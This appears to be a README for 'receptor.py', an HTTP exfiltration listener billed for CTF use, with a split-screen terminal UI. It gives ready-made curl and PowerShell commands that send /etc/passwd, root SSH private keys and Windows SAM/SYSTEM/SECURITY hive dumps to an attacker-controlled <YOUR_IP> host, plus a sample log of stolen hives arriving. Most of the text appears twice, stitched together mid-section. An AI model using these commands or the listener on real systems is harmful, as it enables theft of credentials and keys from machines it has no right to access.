# receptor

HTTP exfiltration listener for CTF environments. Receives POST requests and saves the body as local files, with a live split-screen terminal UI.

## Requirements

- Python 3.6+
- A terminal that supports ANSI escape codes (any modern terminal)

## Usage

```
receptor.py -p <PORT> [options]
```

### Flags

| Flag | Description |
|------|-------------|
| `-p, --port <PORT>` | **(required)** Port to listen on |
| `-q, --quiet` | Suppress per-file log lines — header stats only |
| `-h, --help` | Show help |

## Examples

### Start the listener

```bash
# Standard mode
receptor.py -p 9200

# Quiet mode (header only, no file log lines)
receptor.py -p 9200 -q
```

### Exfiltrate from Linux

```bash
# Single file
curl -X POST http://<YOUR_IP>:9200/passwd --data-binary @/etc/passwd

# Another file
curl -X POST http://<YOUR_IP>:9200/id_rsa --data-binary @/root/.ssh/id_rsa
```

### Exfiltrate from Windows (PowerShell)

```powershell
# Single file
Invoke-WebRequest -Uri http://<YOUR_IP>:9200/sam.save -Method POST -InFile C:\users\public\sam.save

# Multiple files
foreach ($f in @("sam.save","system.save","security.save")) {
    Invoke-WebRequest -Uri http://<YOUR_IP>:9200/$f -Method POST -InFile "C:\users\public\$f"
}
```

> **Note**: Active status may take a moment to update — the transfer is still running in the background.

## Terminal UI

```
+================================================================+
|            EXFIL RECEIVER  --  receptor.py                     |
+================================================================+
  Dir: /workspace/academy/DEV01dumps   Port: 0.0.0.0:9200
  Files: 3  Last: 5s ago <- system.save  Active: idle

  [Linux]   curl -X POST http://<IP>:9200/<file> --data-binary @<file>
  [Windows] Invoke-WebRequest -Uri http://<IP>:9200/<file> -Method POST -InFile <file>
  [!] Active status may take a moment to update -- transfer is still in progress
-----------------------------------------------------------------
[20:10:32] [+] security.save   48.0 KB  <- 10.10.10.5  -> /workspace/.../security.save
[20:10:54] [+] system.save     12.0 MB  <- 10.10.10.5  -> /workspace/.../system.save
[20:11:20] [+] sam.save        56.0 KB  <- 10.10.10.5  -> /workspace/.../sam.save
```

The header **overwrites itself in place** using ANSI scroll regions — only new file entries scroll at the bottom.

## How it works
# receptor.py

HTTP exfiltration listener for CTF environments. Receives POST requests and saves the body as local files, with a live split-screen terminal UI.

## Requirements

- Python 3.6+
- A terminal that supports ANSI escape codes (any modern terminal)

## Usage

```
receptor.py -p <PORT> [options]
```

### Flags

| Flag | Description |
|------|-------------|
| `-p, --port <PORT>` | **(required)** Port to listen on |
| `-q, --quiet` | Suppress per-file log lines — header stats only |
| `-h, --help` | Show help |

## Examples

### Start the listener

```bash
# Standard mode
receptor.py -p 9200

# Quiet mode (header only, no file log lines)
receptor.py -p 9200 -q
```

### Exfiltrate from Linux

```bash
# Single file
curl -X POST http://<YOUR_IP>:9200/passwd --data-binary @/etc/passwd

# Another file
curl -X POST http://<YOUR_IP>:9200/id_rsa --data-binary @/root/.ssh/id_rsa
```

### Exfiltrate from Windows (PowerShell)

```powershell
# Single file
Invoke-WebRequest -Uri http://<YOUR_IP>:9200/sam.save -Method POST -InFile C:\users\public\sam.save

# Multiple files
foreach ($f in @("sam.save","system.save","security.save")) {
    Invoke-WebRequest -Uri http://<YOUR_IP>:9200/$f -Method POST -InFile "C:\users\public\$f"
}
```

> **Note**: Active status may take a moment to update — the transfer is still running in the background.

## Terminal UI

```
+================================================================+
|            EXFIL RECEIVER  --  receptor.py                     |
+================================================================+
  Dir: /workspace/academy/DEV01dumps   Port: 0.0.0.0:9200
  Files: 3  Last: 5s ago <- system.save  Active: idle

  [Linux]   curl -X POST http://<IP>:9200/<file> --data-binary @<file>
  [Windows] Invoke-WebRequest -Uri http://<IP>:9200/<file> -Method POST -InFile <file>
  [!] Active status may take a moment to update -- transfer is still in progress
-----------------------------------------------------------------
[20:10:32] [+] security.save   48.0 KB  <- 10.10.10.5  -> /workspace/.../security.save
[20:10:54] [+] system.save     12.0 MB  <- 10.10.10.5  -> /workspace/.../system.save
[20:11:20] [+] sam.save        56.0 KB  <- 10.10.10.5  -> /workspace/.../sam.save
```

The header **overwrites itself in place** using ANSI scroll regions — only new file entries scroll at the bottom.

## How it works

Files are saved to the **current working directory** at the time `receptor.py` is launched. The URL path becomes the filename:

```
POST /sam.save  →  ./sam.save
POST /loot/id_rsa  →  ./loot/id_rsa  (subdirectory created automatically)
POST /  →  ./dump_20260413_201032.bin  (auto-named)
```

Files are saved to the **current working directory** at the time `receptor.py` is launched. The URL path becomes the filename:

```
POST /sam.save  →  ./sam.save
POST /loot/id_rsa  →  ./loot/id_rsa  (subdirectory created automatically)
POST /  →  ./dump_20260413_201032.bin  (auto-named)
```
